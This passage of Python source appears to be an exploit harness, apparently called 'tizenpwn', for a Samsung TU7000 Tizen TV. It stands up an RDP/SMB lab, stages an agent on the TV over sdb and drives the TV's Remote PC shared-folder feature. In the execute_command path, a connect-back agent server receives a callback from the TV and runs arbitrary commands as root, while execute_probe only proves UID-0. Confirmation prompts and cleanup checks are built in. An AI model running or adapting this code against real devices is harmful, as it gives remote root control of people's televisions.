                    raise CifsRouteError(
                        "the TV agent returned a malformed command result"
                    )
                try:
                    exit_code = int(fields[1])
                    output = base64.b64decode(
                        fields[2], validate=True
                    ).decode("utf-8", errors="replace")
                except (ValueError, binascii.Error) as error:
                    raise CifsRouteError(
                        "the TV agent returned an invalid result"
                    ) from error
                results.append(
                    {
                        "command": command,
                        "exit_code": exit_code,
                        "stdout": output,
                    }
                )
            writer.write(b"__EXIT__\n")
            writer.flush()
            return identity, results
        except TimeoutError as error:
            raise CifsRouteError(
                "the TV agent session timed out"
            ) from error
        finally:
            self.close_connection()

    @staticmethod
    def _read_line(reader) -> str:
        line = reader.readline()
        if not line:
            raise CifsRouteError("the TV agent disconnected")
        try:
            return line.decode("utf-8").strip()
        except UnicodeDecodeError as error:
            raise CifsRouteError(
                "the TV agent sent a non-UTF-8 response"
            ) from error

    def close_connection(self) -> None:
        for stream in (self._reader, self._writer):
            if stream is not None:
                try:
                    stream.close()
                except OSError:
                    pass
        self._reader = None
        self._writer = None
        if self._connection is not None:
            try:
                self._connection.close()
            except OSError:
                pass
            self._connection = None

    def close(self) -> None:
        self.close_connection()
        try:
            self._listener.close()
        except OSError:
            pass


class ConsolePrompter:
    def __init__(self, timeout: float = DEFAULT_ACCEPT_TIMEOUT) -> None:
        self.timeout = timeout

    def __call__(self, instruction: str, expected: str) -> None:
        if not sys.stdin.isatty():
            raise CifsRouteError(
                "live manual gates require an interactive terminal"
            )
        print(instruction)
        print(f"Type exactly: {expected}")
        ready, _, _ = select.select((sys.stdin,), (), (), self.timeout)
        if not ready:
            raise CifsRouteError(
                "manual gate timed out; stop without retry"
            )
        if sys.stdin.readline().rstrip("\n") != expected:
            raise CifsRouteError(
                "manual gate text mismatch; stop without retry"
            )


def _form_card(
    assessment: Tu7000Assessment,
    identity: CifsRunIdentity,
    callback_host: str,
    fingerprint: str,
) -> None:
    print("\nPRIVATE ONE-TIME REMOTE PC FORM VALUES (do not record this screen)")
    print(f"  TV: {assessment.model} / {FIRMWARE}")
    print(f"  PC/Profile address: {callback_host}")
    print("  Protocol: RDP (not VNC)")
    print(f"  Username: {LAB_USER}")
    print(f"  Password: {identity.password}")
    print(f"  Shared folder name: {identity.share}")
    print("  Shared folder / remember: enabled; save the temporary profile")
    print(f"  Expected disposable RDP certificate SHA-256: {fingerprint}")
    print("  Do not press Shared Folder yet.\n")


def _agent_form_card(
    assessment: Tu7000Assessment,
    identity: AgentRunIdentity,
    callback_host: str,
    fingerprint: str,
) -> None:
    print("\nPRIVATE ONE-TIME REMOTE PC FORM VALUES (do not record this screen)")
    print(f"  TV: {assessment.model} / {FIRMWARE}")
    print(f"  PC/Profile address: {callback_host}")
    print("  Protocol: RDP (not VNC)")
    print(f"  Username: {LAB_USER}")
    print(f"  Password: {identity.password}")
    print(f"  Shared folder name: {identity.share}")
    print("  Shared folder / remember: enabled; save the temporary profile")
    print(f"  Expected disposable RDP certificate SHA-256: {fingerprint}")
    print("  Do not press Shared Folder yet.\n")


def _stage_agent(
    client: SdbClient,
    identity: AgentRunIdentity,
    code: str,
) -> str:
    _validate_agent_identity(identity)
    expected = hashlib.sha256(code.encode("utf-8")).hexdigest()
    with tempfile.TemporaryDirectory(prefix="tizenpwn-agent-") as temp:
        local = Path(temp) / "agent"
        local.write_text(code, encoding="utf-8")
        os.chmod(local, 0o600)
        client.push(local, PurePosixPath(identity.path))
    observed = _capture(
        client,
        f"sha256sum {identity.path}",
        DEFAULT_SDB_TIMEOUT,
    )
    fields = observed.split()
    if len(fields) < 1 or fields[0] != expected:
        raise CifsRouteError(
            "the staged agent data did not match its host-side digest"
        )
    return expected


def _cleanup_agent(client: SdbClient, identity: AgentRunIdentity) -> bool:
    _validate_agent_identity(identity)
    try:
        client.inject(
            f"/bin/rm -f {identity.path}",
            timeout=DEFAULT_SDB_TIMEOUT,
        )
    except SdbError as error:
        raise CifsRouteError("agent staging cleanup failed") from error
    output = _capture(
        client,
        f"test ! -e {identity.path} && echo absent",
        DEFAULT_SDB_TIMEOUT,
    )
    return output == "absent"


def _system_health(client: SdbClient) -> bool:
    try:
        client.require_device()
        output = _capture(
            client,
            "pgrep -f '^/usr/apps/privileged-service/bin/ps_agent$' "
            ">/dev/null && echo ps-agent-running",
            DEFAULT_SDB_TIMEOUT,
        )
    except (CifsRouteError, SdbError):
        return False
    return output == "ps-agent-running"


def execute_probe(
    tv_host: str,
    *,
    confirm: str,
    accept_saved_profile: bool,
    sdb_timeout: float = DEFAULT_SDB_TIMEOUT,
    callback_host: str | None = None,
    bind_host: str | None = None,
    rdp_port: int = DEFAULT_RDP_PORT,
    smb_port: int = DEFAULT_SMB_PORT,
    image: str | None = None,
    accept_timeout: float = DEFAULT_ACCEPT_TIMEOUT,
    prompt: ConsolePrompter | None = None,
    runner: Runner | None = None,
    client: SdbClient | None = None,
    sleep=time.sleep,
) -> dict[str, object]:
    if confirm != CONFIRMATION:
        raise CifsRouteError(
            f"live mode requires --confirm {CONFIRMATION}"
        )
    if not accept_saved_profile:
        raise CifsRouteError(
            "live mode requires --accept-saved-profile; the TV will store a "
            "temporary Remote PC profile that must be deleted manually"
        )
    ipaddress.IPv4Address(tv_host)
    callback = callback_host or route_callback_host(tv_host)
    bind = bind_host or callback
    ipaddress.IPv4Address(callback)
    ipaddress.IPv4Address(bind)
    if bind == "0.0.0.0":
        raise CifsRouteError(
            "--bind-host must be one concrete address for the disposable lab"
        )
    prompt = prompt or ConsolePrompter(accept_timeout)
    runner = runner or Runner()
    client = client or SdbClient(find_sdb(), tv_host, timeout=sdb_timeout)
    assessment = assess_target(tv_host, sdb_timeout=sdb_timeout, client=client)
    identity = fresh_identity()
    lab = CifsLab(
        identity,
        bind=bind,
        rdp_port=rdp_port,
        smb_port=smb_port,
        image=image,
        runner=runner,
    )
    evidence: dict[str, object] = {
        "model": assessment.model,
        "host": tv_host,
        "firmware": FIRMWARE,
        "build": assessment.compatibility.fingerprint.build_id,
        "route": "remotepc-cifs",
        "confirmation": confirm,
        "marker": identity.marker,
        "share": identity.share,
        "lab_bind": bind,
        "rdp_port": rdp_port,
        "smb_port": smb_port,
        "artifacts": {
            artifact.path: artifact.observed
            for artifact in assessment.artifacts
        },
        "system_files_unchanged": False,
        "staging_cleaned": False,
        "post_run_healthy": False,
    }
    primary_error: BaseException | None = None
    cleanup_errors: list[BaseException] = []
    try:
        require_ports_available(bind, (rdp_port, smb_port))
        lab.build()
        lab.start()
        lab.selftest()
        fingerprint = lab.certificate_fingerprint()
        _form_card(assessment, identity, callback, fingerprint)
        prompt(
            "On the TV, create/select the Remote PC profile with the exact "
            "values above, connect once, compare the certificate fingerprint, "
            "leave persistent certificate trust unchecked, and wait for the "
            "disposable host xterm. Then return here.",
            "CONNECTED",
        )
        lab.require_rdp_login()
        evidence["rdp_logins"] = 1
        smb_before = lab.logs().count("NetrShareEnum Level: 1")
        prompt(
            "Reveal the TV's top toolbar, click Shared Folder exactly once, "
            "then return here. A wrong or repeated click is terminal.",
            "CLICKED",
        )
        sleep(2)
        smb_after = lab.logs().count("NetrShareEnum Level: 1")
        if smb_after != smb_before + 1:
            raise CifsRouteError(
                "the single SMB observation window did not contain exactly "
                "one share enumeration"
            )
        evidence["smb_enumeration_events"] = 1
        if not classify_uid0_once(client, identity):
            raise CifsRouteError(
                "one-shot classification completed with no UID-0 proof; "
                "do not retry"
            )
        evidence["uid"] = 0
        evidence["root_identity"] = read_root_identity(client, identity)
        evidence["classification"] = "uid0-proof"
        return evidence
    except BaseException as error:
        primary_error = error
        raise
    finally:
        try:
            lab.stop()
        except BaseException as error:  # noqa: BLE001
            cleanup_errors.append(error)
        try:
            require_ports_closed(bind, (rdp_port, smb_port))
            evidence["lab_cleaned"] = True
        except BaseException as error:  # noqa: BLE001
            cleanup_errors.append(error)
        if primary_error is None:
            try:
                final_hashes = _capture(
                    client, SYSTEM_HASH_COMMAND, sdb_timeout
                )
                evidence["system_files_unchanged"] = (
                    final_hashes == assessment.system_hashes
                )
                evidence["staging_cleaned"] = cleanup_target(client, identity)
                evidence["post_run_healthy"] = _system_health(client)
            except BaseException as error:  # noqa: BLE001
                cleanup_errors.append(error)
            if (
                not evidence["system_files_unchanged"]
                or not evidence["staging_cleaned"]
                or not evidence["post_run_healthy"]
            ):
                cleanup_errors.append(
                    CifsRouteError(
                        "cleanup or post-run health verification failed; "
                        f"marker={identity.marker} stage={identity.stage}"
                    )
                )
        else:
            try:
                evidence["staging_cleaned"] = cleanup_target(client, identity)
            except BaseException as error:  # noqa: BLE001
                cleanup_errors.append(error)
        if cleanup_errors:
            if primary_error is None:
                raise CifsRouteError(
                    "cleanup or post-run health verification failed: "
                    + "; ".join(str(error) for error in cleanup_errors)
                ) from cleanup_errors[0]
            raise CifsRouteError(
                "the live run failed and cleanup/post-run verification also "
                "failed: "
                + "; ".join(str(error) for error in cleanup_errors)
            ) from primary_error


def execute_command(
    tv_host: str,
    *,
    confirm: str,
    accept_saved_profile: bool,
    commands: tuple[str, ...],
    sdb_timeout: float = DEFAULT_SDB_TIMEOUT,
    callback_host: str | None = None,
    bind_host: str | None = None,
    rdp_port: int = DEFAULT_RDP_PORT,
    smb_port: int = DEFAULT_SMB_PORT,
    image: str | None = None,
    agent_timeout: float = DEFAULT_AGENT_TIMEOUT,
    accept_timeout: float = DEFAULT_ACCEPT_TIMEOUT,
    prompt: ConsolePrompter | None = None,
    runner: Runner | None = None,
    client: SdbClient | None = None,
    sleep=time.sleep,
) -> dict[str, object]:
    if confirm != CONFIRMATION:
        raise CifsRouteError(
            f"live mode requires --confirm {CONFIRMATION}"
        )
    if not accept_saved_profile:
        raise CifsRouteError(
            "live mode requires --accept-saved-profile; the TV will store a "
            "temporary Remote PC profile that must be deleted manually"
        )
    if not commands:
        raise CifsRouteError("at least one --command is required")
    ipaddress.IPv4Address(tv_host)
    callback = callback_host or route_callback_host(tv_host)
    bind = bind_host or callback
    ipaddress.IPv4Address(callback)
    ipaddress.IPv4Address(bind)
    if bind == "0.0.0.0":
        raise CifsRouteError(
            "--bind-host must be one concrete address for the disposable lab"
        )
    prompt = prompt or ConsolePrompter(accept_timeout)
    runner = runner or Runner()
    client = client or SdbClient(find_sdb(), tv_host, timeout=sdb_timeout)
    assessment = assess_target(tv_host, sdb_timeout=sdb_timeout, client=client)
    identity = fresh_agent_identity()
    lab = CifsLab(
        identity,
        bind=bind,
        rdp_port=rdp_port,
        smb_port=smb_port,
        image=image,
        runner=runner,
    )
    agent = AgentServer(callback, identity.secret)
    evidence: dict[str, object] = {
        "model": assessment.model,
        "host": tv_host,
        "firmware": FIRMWARE,
        "build": assessment.compatibility.fingerprint.build_id,
        "route": "remotepc-cifs",
        "confirmation": confirm,
        "agent": "bash-inline-challenge-response",
        "agent_path": identity.path,
        "share": identity.share,
        "lab_bind": bind,
        "rdp_port": rdp_port,
        "smb_port": smb_port,
        "agent_port": agent.port,
        "authenticated": False,
        "artifacts": {
            artifact.path: artifact.observed
            for artifact in assessment.artifacts
        },
        "commands": [],
        "system_files_unchanged": False,
        "staging_cleaned": False,
        "post_run_healthy": False,
    }
    primary_error: BaseException | None = None
    cleanup_errors: list[BaseException] = []
    try:
        require_ports_available(bind, (rdp_port, smb_port))
        lab.build()
        lab.start()
        lab.selftest()
        fingerprint = lab.certificate_fingerprint()
        code = agent_code(identity, callback, agent.port)
        _stage_agent(client, identity, code)
        _agent_form_card(assessment, identity, callback, fingerprint)
        prompt(
            "On the TV, create/select the Remote PC profile with the exact "
            "values above, connect once, compare the certificate fingerprint, "
            "leave persistent certificate trust unchecked, and wait for the "
            "disposable host xterm. Then return here.",
            "CONNECTED",
        )
        lab.require_rdp_login()
        evidence["rdp_logins"] = 1
        smb_before = lab.logs().count("NetrShareEnum Level: 1")
        prompt(
            "Reveal the TV's top toolbar, click Shared Folder exactly once, "
            "then return here. A wrong or repeated click is terminal.",
            "CLICKED",
        )
        sleep(2)
        smb_after = lab.logs().count("NetrShareEnum Level: 1")
        if smb_after != smb_before + 1:
            raise CifsRouteError(
                "the single SMB observation window did not contain exactly "
                "one share enumeration"
            )
        evidence["smb_enumeration_events"] = 1
        root_identity, results = agent.accept_and_run(
            commands, timeout=agent_timeout
        )
        evidence["authenticated"] = True
        evidence["uid"] = 0
        evidence["root_identity"] = root_identity
        evidence["commands"] = results
        evidence["classification"] = "authenticated-root-command"
        return evidence
    except BaseException as error:
        primary_error = error
        raise
    finally:
        agent.close()
        try:
            lab.stop()
        except BaseException as error:  # noqa: BLE001
            cleanup_errors.append(error)
        try:
            require_ports_closed(bind, (rdp_port, smb_port))
            evidence["lab_cleaned"] = True
        except BaseException as error:  # noqa: BLE001
            cleanup_errors.append(error)
        try:
            evidence["staging_cleaned"] = _cleanup_agent(client, identity)
        except BaseException as error:  # noqa: BLE001
            cleanup_errors.append(error)
        if primary_error is None:
            try:
                final_hashes = _capture(
                    client, SYSTEM_HASH_COMMAND, sdb_timeout
                )
                evidence["system_files_unchanged"] = (
                    final_hashes == assessment.system_hashes
                )
                evidence["post_run_healthy"] = _system_health(client)
            except BaseException as error:  # noqa: BLE001
                cleanup_errors.append(error)
            if (
                not evidence["system_files_unchanged"]
                or not evidence["staging_cleaned"]
                or not evidence["post_run_healthy"]
            ):
                cleanup_errors.append(
                    CifsRouteError(
                        "cleanup or post-run health verification failed; "
                        f"agent_path={identity.path}"
                    )
                )
        if cleanup_errors:
            if primary_error is None:
                raise CifsRouteError(
                    "cleanup or post-run health verification failed: "
                    + "; ".join(str(error) for error in cleanup_errors)
                ) from cleanup_errors[0]
            raise CifsRouteError(
                "the live run failed and cleanup/post-run verification also "
                "failed: "
                + "; ".join(str(error) for error in cleanup_errors)
            ) from primary_error
